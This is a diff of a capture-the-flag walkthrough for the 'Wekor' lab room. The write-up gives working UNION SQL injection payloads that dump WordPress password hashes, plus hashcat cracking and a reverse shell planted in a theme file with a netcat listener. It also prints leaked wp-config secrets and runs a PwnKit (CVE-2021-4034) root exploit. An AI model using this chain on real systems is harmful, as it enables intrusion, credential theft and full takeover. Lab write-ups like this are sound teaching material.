@@ -20,8 +20,7 @@ Ok we all love SQLMap but tell this to OffSec which insists (rightfully)
 to learn MANUAL SQL Injection and SQLMap Is Banned!!!
 
 So i made this write-up to walk you through the manual way.
-
-    This is a medium difficulty room so i will skip basic things like how to write to /etc/hosts and how to scan with Nmap!
+This is a medium difficulty room so i will skip basic things like how to write to /etc/hosts and how to scan with Nmap!
 
 First of all the creator of the room instruct us to add “wekor.thm” to /etc/hosts
 This indicates that maybe there are other vhosts and there is at least one webpage.
@@ -74,7 +73,8 @@ Then, lower in the cart page, there is a coupon text box that act weirdly when i
   http://wekor.thm/it-next/it_cart.php
 
 Type just a single-quote inside the textbox ' and the response is:
-    “You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘%’’ at line 1”
+
+```“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘%’’ at line 1”```
 
 It is vulnerable to SQL Injection!
 Lets Own it, Manually of course!
@@ -82,15 +82,18 @@ Lets Own it, Manually of course!
 The first error message we got, indicates that the back-end uses MySQL.
 
 The payload that worked stabilizing the query without errors is:
-  ' OR 1=1 -- -
+
+  	' OR 1=1 -- -
 
 To find the Column count in the current table so that we can work with we type:
+
     ' OR 1=1 UNION ALL SELECT NULL
 
   Response:
     “The used SELECT statements have a different number of columns”
 
 We continue adding NULL values until something returns without errors:
+
     ' OR 1=1 UNION ALL SELECT NULL,NULL
     ' OR 1=1 UNION ALL SELECT NULL,NULL,NULL
 
@@ -100,17 +103,23 @@ With three NULL Values we are good to go.
 We can now enumerate things like database version, hostname, current user, data directory path and many more.
 
 For example we can find MySQL version like so:
-    'OR 1=1 UNION ALL SELECT NULL,NULL,@@version -- -
+```
+'OR 1=1 UNION ALL SELECT NULL,NULL,@@version -- -
+	
   It is 5.7.32!
+  ```
 
 We can see who is the current user:
-    'OR 1=1 UNION ALL SELECT NULL,NULL,user() -- -
+```
+'OR 1=1 UNION ALL SELECT NULL,NULL,user() -- -
+	
   ITS ROOT!!!
-
+```
 
 Anyway Lets move on!
 
 To request all database names we ask for database ‘information_schema’ table ‘schemata’ column ‘schema_name’:
+```
     ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(schema_name) FROM information_schema.schemata -- -
 
   Response:
@@ -121,10 +130,11 @@ To request all database names we ask for database ‘information_schema’ table
     Coupon Code : With ID : And With Expire Date Of : performance_schema Is Valid!
     Coupon Code : With ID : And With Expire Date Of : sys Is Valid!
     Coupon Code : With ID : And With Expire Date Of : WordPress Is Valid!
-
+```
 Of course the database WordPress stands out.
 
 To ask for WordPress’s tables, again from database ‘information_schema’ we ask for table ‘TABLES’:
+```
     ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='wordpress'-- -
 
   Response:
@@ -141,10 +151,11 @@ To ask for WordPress’s tables, again from database ‘information_schema’ we
     Coupon Code : With ID : And With Expire Date Of : wp_terms Is Valid!
     Coupon Code : With ID : And With Expire Date Of : wp_usermeta Is Valid!
     Coupon Code : With ID : And With Expire Date Of : wp_users Is Valid!
-
+```
 The table that stands out now is the wp_users.
 
 To ask for wp_users’s columns, once again from database ‘information_schema’ we ask for table ‘COLUMNS’:
+```
     ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(column_name) FROM information_schema.COLUMNS  WHERE TABLE_NAME='wp_users'-- -
 
   Response:
@@ -159,9 +170,10 @@ To ask for wp_users’s columns, once again from database ‘information_schema�
     Coupon Code : With ID : And With Expire Date Of : user_activation_key Is Valid!
     Coupon Code : With ID : And With Expire Date Of : user_status Is Valid!
     Coupon Code : With ID : And With Expire Date Of : display_name Is Valid!
-
+```
 
 So now we know what we ask for! Lets Dump the useful stuff!
+```
     ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(0x28,user_login,0x3a,user_pass,0x29) FROM wordpress.wp_users -- -
 
   Response:
@@ -170,57 +182,68 @@ So now we know what we ask for! Lets Dump the useful stuff!
     Coupon Code : With ID : And With Expire Date Of : wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 Is Valid!
     Coupon Code : With ID : And With Expire Date Of : wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ Is Valid!
     Coupon Code : With ID : And With Expire Date Of : wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ Is Valid!
-
+```
 Nice ❤
 
 To identify the hash navigate to:
+
 https://hashcat.net/wiki/doku.php?id=example_hashes
 
 Press Ctr+F to use ‘Find’ inside the page and type $P$
+
     400 phpass, WordPress (MD5), Joomla (MD5)
 
 To crack the Hashes save all the hashes inside a file ex.: hashes.txt and then:
+
     hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
 
 
 CRACKED HASHES:
-
+```
 wp_yura:********
 wp_eagle:******
 wp_jeffrey:*******
-
+```
 
 I enumerated the rest of the columns and found nothing more valuable that these hashes. 
+```
     ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(0x28,user_login,0x3a,user_activation_key,0x29) FROM wordpress.wp_users -- -
 
   Response:
     Coupon Code : With ID : And With Expire Date Of : (admin:1653007217:$P$BXuW77/My0s1ULQmkWaLEnoGljjLW5/) Is Valid!
     Coupon Code : With ID : And With Expire Date Of : (wp_jeffrey:1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0) Is Valid!
-
+```
 
 Login with user wp_yura:
+
     http://site.wekor.thm/wordpress/wp-login.php
 
 We can see that we have enough access for our needs!
 
 Download the PHP Reverse Shell from Pentest Monkey from this link:
+
     http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
 
 Edit it properly (replace the defaults with your THM tunX IP Address And the Listening Port ex:1234)
 
 In the WordPress account navigate from the Left Control Panel to:
+
     Appearance → Theme Editor
 
 From the Right Control Panel → Archives(archive.php)
 
 Replace archive.php with the edited PHP Reverse Shell.
+
 (In a real engagement we should keep a backup of everything we messed with, but for now we are good)
+
 Update The File and set a Listener.
 
 I prefer using ‘rlwrap’ with netcat. So:
+
     rlwrap nc -lvnp 1234
 
 Trigger the reverse shell accessing:
+
     http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/archive.php
 
 
@@ -230,6 +253,7 @@ Trigger the reverse shell accessing:
 Start manually enumerating the “low hanging fruits”
 
 READING THE WP-CONFIG
+```
     cat /var/www/html/site.wekor.thm/wordpress/wp-config.php
 
     define( 'AUTH_KEY',         'V_hD%g&hh2BANp3+5fMB?>4lG}<OH*cd(6UnE/WqmdZTLo#8h4tN}[Ckdq`]{@kI' );
@@ -247,17 +271,21 @@ READING THE WP-CONFIG
     /** MySQL database password */
     define( 'DB_PASSWORD', 'root123@#59' );
 
-
+```
 This Password does not work with any user account.
+
 Inside MySQL there isn’t something new, so we move on.
 
 I don't have access to any home directory and there aren't useful files inside /opt /var/backups and so on… 
+
 There are ports listening, indicating internal network but i will try a different way. 
+
     $meminstance ("127.0.0.1",11211)
+	
 The way abusing the internal services is well described in other write-ups.
 
 
-Hitting uname -a i notice a very old distribution.
+Hitting ```uname -a``` i notice a very old distribution.
 I believe it is vulnerable to pwnkit. The pkexec vulnerability that made millions of ITs lose their sleep, so,
 
 Lets Try:
@@ -265,6 +293,7 @@ Lets Try:
 ###PRIVESC###
 
 Download Exploit From:
+
     git clone https://github.com/berdav/CVE-2021-4034
 
 ZIP The folder → CVE.zip
@@ -273,6 +302,7 @@ wget TO TARGET
 --->
 
 Then hit the following commands:
+
     unzip CVE.zip
     cd CVE-2021–4034
     cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
@@ -288,6 +318,7 @@ Oh Yeah!
 We are root!
 
 We can now read the flags:
+
     cat /home/Orka/flag.txt
     cat /root/root.txt
 
